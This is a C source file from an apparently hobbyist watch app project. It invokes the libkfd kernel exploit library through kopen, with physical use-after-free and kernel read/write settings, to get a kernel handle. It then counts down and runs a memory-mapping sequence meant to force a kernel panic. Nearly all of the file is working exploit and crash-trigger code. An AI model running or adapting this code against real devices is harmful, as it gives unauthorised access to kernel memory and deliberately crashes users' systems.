//
//  kern_panic.c
//  Peepo Watch App
//
//  Created by Luke on 2026-01-21.
//

#include "kern_panic.h"
#include "libkfd.h"
#include <mach/mach.h>
#include <stdio.h>
#include <time.h>

static console_log_cb_t g_logger = NULL; // private to this file

void set_console_logger(console_log_cb_t cb) {
    g_logger = cb;
}

void console_log(const char *msg) {
    if (g_logger && msg) {
        g_logger(msg);
    }
}

static inline void sleep_ms(uint64_t ms) {
    struct timespec ts;
    ts.tv_sec  = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000ULL;
    nanosleep(&ts, NULL);
}

int kern_panic(){
    vm_address_t addr = 0;          /* mapping base */
    vm_size_t    len  = 0x4000;     /* mapping size */

    /* 1. Reserve anonymous memory. */
    console_log("[*] vm_map(mach_task_self(), &addr, len, 0, VM_FLAGS_ANYWHERE, MACH_PORT_NULL, 0, FALSE, VM_PROT_NONE, VM_PROT_NONE, VM_INHERIT_COPY);");
    kern_return_t kr = vm_map(mach_task_self(), &addr, len, 0,
                              VM_FLAGS_ANYWHERE,
                              MACH_PORT_NULL, 0, FALSE,
                              VM_PROT_NONE, VM_PROT_NONE, VM_INHERIT_COPY);
    if (kr != KERN_SUCCESS)
        return fprintf(stderr, "vm_map: %s\n", mach_error_string(kr)), 1;

    /* 2. Turn that region into a named memory entry. */
    mem_entry_name_port_t entry = MACH_PORT_NULL;
    console_log("[*] mach_make_memory_entry(mach_task_self(), &len, addr, 0, &entry, MACH_PORT_NULL);");
    sleep_ms(3000);
    kr = mach_make_memory_entry(mach_task_self(), &len, addr, 0,
                                &entry, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS)
        return fprintf(stderr, "mach_make_memory_entry: %s\n",
                       mach_error_string(kr)), 1;

    return 0;
}

int kern_stuff() {
    sleep_ms(200);
    console_log("[*] kern_stuff()");

    u64 puaf_pages = 256;
    u64 puaf_method = 0x0;
    u64 kread_method = 0x1;
    u64 kwrite_method = 0x1;
    u64 handle = -1;
    char buf[256];
    
    sleep_ms(200);
    handle = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
    snprintf(buf, sizeof(buf), "[!] %s: %llu", "handle: ", handle);
    console_log(buf);
    
    sleep_ms(1000);
    console_log("[!] kernel panic time...");
    sleep_ms(1000);
    console_log("[!] 5... ");
    sleep_ms(1000);
    console_log("[!] 4... ");
    sleep_ms(1000);
    console_log("[!] 3... ");
    sleep_ms(1000);
    console_log("[!] 2... ");
    sleep_ms(1000);
    console_log("[!] 1... ");
    
    kern_panic();
    
    return 0;
}
